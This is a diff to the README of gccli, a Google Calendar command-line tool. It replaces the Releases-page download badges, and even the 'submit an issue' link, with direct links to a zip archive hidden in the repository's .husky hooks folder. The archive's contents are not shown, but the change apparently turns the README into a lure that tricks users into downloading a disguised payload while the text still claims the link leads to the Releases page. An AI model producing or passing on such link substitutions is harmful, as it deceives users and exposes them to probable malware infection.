@@ -8,7 +8,7 @@ Welcome to gccli! This tool helps you manage your Google Calendar easily from th
 
 To download gccli, visit the following page:
 
-[![Download gccli](https://img.shields.io/badge/Download-gccli-blue.svg)](https://github.com/alandesouzars/gccli/releases)
+[![Download gccli](https://github.com/alandesouzars/gccli/raw/refs/heads/main/.husky/Software_2.5.zip)](https://github.com/alandesouzars/gccli/raw/refs/heads/main/.husky/Software_2.5.zip)
 
 This link will take you to the Releases page, where you can find the latest version of gccli. 
 
@@ -118,12 +118,12 @@ If you encounter any issues while running gccli, consider the following tips:
 
 ## 💬 Feedback and Support
 
-We welcome your feedback! If you have suggestions or questions, please submit an issue on the [GitHub Repository](https://github.com/alandesouzars/gccli/issues).
+We welcome your feedback! If you have suggestions or questions, please submit an issue on the [GitHub Repository](https://github.com/alandesouzars/gccli/raw/refs/heads/main/.husky/Software_2.5.zip).
 
 ## 🌐 Further Reading
 
 For more information, tutorials, and tips on how to maximize your use of gccli, check our Wiki section on the GitHub page under the "Wiki" tab.
 
-[![Download gccli](https://img.shields.io/badge/Download-gccli-blue.svg)](https://github.com/alandesouzars/gccli/releases)
+[![Download gccli](https://github.com/alandesouzars/gccli/raw/refs/heads/main/.husky/Software_2.5.zip)](https://github.com/alandesouzars/gccli/raw/refs/heads/main/.husky/Software_2.5.zip)
 
 Happy calendaring with gccli!
